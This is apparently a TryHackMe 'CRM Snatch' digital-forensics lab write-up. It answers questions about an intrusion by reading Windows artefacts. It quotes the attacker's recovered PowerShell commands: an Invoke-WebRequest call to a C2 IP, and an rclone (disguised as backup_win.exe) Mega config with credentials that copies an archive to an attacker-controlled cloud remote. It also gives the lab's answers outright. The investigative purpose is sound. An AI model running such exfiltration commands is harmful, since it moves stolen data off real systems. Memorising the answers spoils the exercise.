# CRM Snatch

Room link [here](https://tryhackme.com/room/crmsnatch)

1. Which domain account was used to initiate the remote session onto the host?
*Answer*: matthew.collins
* Initial guess on this one based on the background information and understanding about the attacker level of privilege as well as user creds from previous rooms that were answered. Username shows up as exploited and previous rooms show compromise. 

2. For how many seconds did the attacker maintain their PowerShell session active?
*Answer*: 3455
* Look at UserAssist from the NTUSER.dat file for matthew.collins and cross reference with the date/time. 

3. What was the attacker's C2 IP address used for staging and exfiltration?
*Answer*: 167.172.41.141
* Found within the PSReadline console history for the user matthew.collins. It looks like: ```Invoke-WebRequest -Uri "http://167.172.41.141:8080/Exfil_Temp.7z"```. 

4. Which well-known tool was used to exfiltrate the collected data?
*Answer*: rclone 
* Traffic can be found within the MFT after exporting and searching for user matthew.collins activity. You can also see the activity within the PSReadLine console history for the user. I had to do some research to figure out that rclone is a common cloud storage tool.  

5. What is the obscured password to the attacker-controlled Mega?
*Answer*: yWKgVA7Rv1iIoG-VWAr7NAFbwKHNiMZGNybJ4QybJHtiFg
* Looking at the PSReadline console history output. Then go to the mega.conf file within the described directory.  
```
[crmremote]`
type = mega`
user = harmlessuser98@proton.me`
pass = & "$env:TEMP\backup_win.exe" obscure Wrt@5LXo6k6dum&JF9`
"@ | Out-File "C:\ProgramData\sync\mega.conf" -Encoding ASCII
& "C:\ProgramData\sync\backup_win.exe" --config "C:\ProgramData\sync\mega.conf" copy C:\Exfil_Temp.7z crmremote:DecptiTech_exfil_backups/
$MegaPass = (& "$env:TEMP\backup_win.exe" obscure "Wrt@5LXo6k6dum&JF9"`
)
@"`

```

6. What is Lucas's email address found in the exfiltrated data?
*Answer*: lucas.rivera@deceptitech.thm
* Find the email within the Exfil_Temp file within the CRM folder. 